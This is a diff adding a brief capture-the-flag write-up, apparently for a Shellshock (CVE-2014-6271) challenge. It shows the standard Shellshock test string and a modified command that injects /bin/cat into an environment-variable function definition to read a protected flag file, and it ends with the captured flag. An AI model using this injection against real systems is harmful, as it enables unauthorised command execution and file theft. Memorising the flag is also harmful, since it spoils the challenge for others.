@@ -1,0 +1,5 @@
+1. took a shellshock exploiting string from google:
+env X=”() { :;} ; echo Bash is Infected” /bin/sh -c “echo completed” 
+2. changed it to run ./shellshock instead of bash binary, changed the command to execute to /bin/cat flag
+env X="() { :;}; /bin/cat /home/shellshock/flag" ./shellshock
+flag: "only if I knew CVE-2014-6271 ten years ago..!!"
